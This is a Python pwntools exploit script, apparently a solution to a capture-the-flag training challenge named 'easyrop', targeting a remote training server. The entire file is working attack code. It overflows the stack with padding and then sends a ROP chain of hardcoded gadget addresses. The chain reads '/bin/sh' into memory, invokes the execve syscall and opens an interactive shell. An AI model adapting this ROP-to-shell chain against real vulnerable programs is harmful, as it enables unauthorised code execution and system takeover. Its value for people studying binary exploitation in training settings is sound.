from pwn import *
import sys

binary = ELF("./easyrop")
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2015)
else:
    r = process('./easyrop')
    gdb.attach(r, '''
        b *0x0804841c
        c
    ''')

POP_RDI_RSI_RDX_RAX = 0x4001c2
POP_RAX = 0x4001c5
SYSCALL = 0x4001b3

input('press a key..')

r.recvuntil("Try easyROP!\n")

def write_address_32(address):
    payload = p32(address)
    r.send(payload)
    payload = p32(0)
    r.send(payload)
    sleep(0.5)

def write_address_64(address):
    write_address_32(address & 0xffffffff) #LSB
    write_address_32((address >> 32) & 0xffffffff) #MSB


for i in range(0, 14):
    payload = p64(0)
    r.send(payload)

write_address_64(POP_RDI_RSI_RDX_RAX)
write_address_64(0)
write_address_64(0x00600370)
write_address_64(8)
write_address_64(0)
write_address_64(SYSCALL)
write_address_64(0)
write_address_64(POP_RDI_RSI_RDX_RAX)
write_address_64(0x00600370)
write_address_64(0)
write_address_64(0)
write_address_64(0x3b)
write_address_64(SYSCALL)
write_address_64(0)

r.sendline()
sleep(1)
r.sendline()
sleep(1)


input('FIGA')

r.send('/bin/sh\x00')
r.interactive()

    

